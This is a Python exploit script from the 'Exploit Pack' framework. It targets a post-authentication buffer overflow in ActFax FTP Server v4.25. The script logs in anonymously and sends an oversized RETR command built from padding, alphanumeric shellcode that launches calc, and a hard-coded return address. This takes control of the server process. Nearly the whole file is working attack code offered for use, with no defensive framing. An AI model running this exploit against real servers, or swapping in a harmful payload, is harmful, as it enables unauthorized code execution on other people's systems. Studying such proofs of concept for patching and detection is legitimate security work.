#Exploit Pack - Security Framework for Exploit Developers
#Copyright 2011 Juan Sacco http://exploitpack.com
#
#This program is free software: you can redistribute it and/or modify it under the terms of the
#GNU General Public License as published by the Free Software Foundation, either version 3 
#or any later version.
#
#This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
#without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR
#PURPOSE. See the GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License along with this program. 
#If not, see http://www.gnu.org/licenses/

import socket
import sys

if len(sys.argv)!= 3:
    print "ActFax FTP Server v4.25 Remote BOF (post auth) Exploit\n"
    print "\n[*] Usage: %s <ip> <port>\n" % sys.argv[0]
    sys.exit(0)


target = str(sys.argv[1])
port = int(sys.argv[2])

user = "anonymous"
passw = "anonymous"

    
# pops calc
calccode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJINkXlqELKZL587"
calccode += "Pep7PdoaxsSSQbLPcLMw5JXbpX8KwOcHBPwkON0A"
 
# push ebp #pop eax #sub eax,55555521 * 3
junk = "\x55\x58\x2D\x21\x55\x55\x55\x2D"
junk += "\x21\x55\x55\x55\x2D\x21\x55\x55\x55" 
junk += "C"*135 + calccode + "A"*(616-len(calccode))

payload = junk + "\x37\x27\x40\x00" #RETN

print ('Connecting to: '+ target+' port: '+str(port))
 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((target, port))
s.recv(1024)
s.send('USER '+ user +'\r\n')
print (s.recv(1024))
s.send('PASS '+ passw +'\r\n')
print (s.recv(1024))
s.send('RETR ' + payload + '\r\n')
s.close
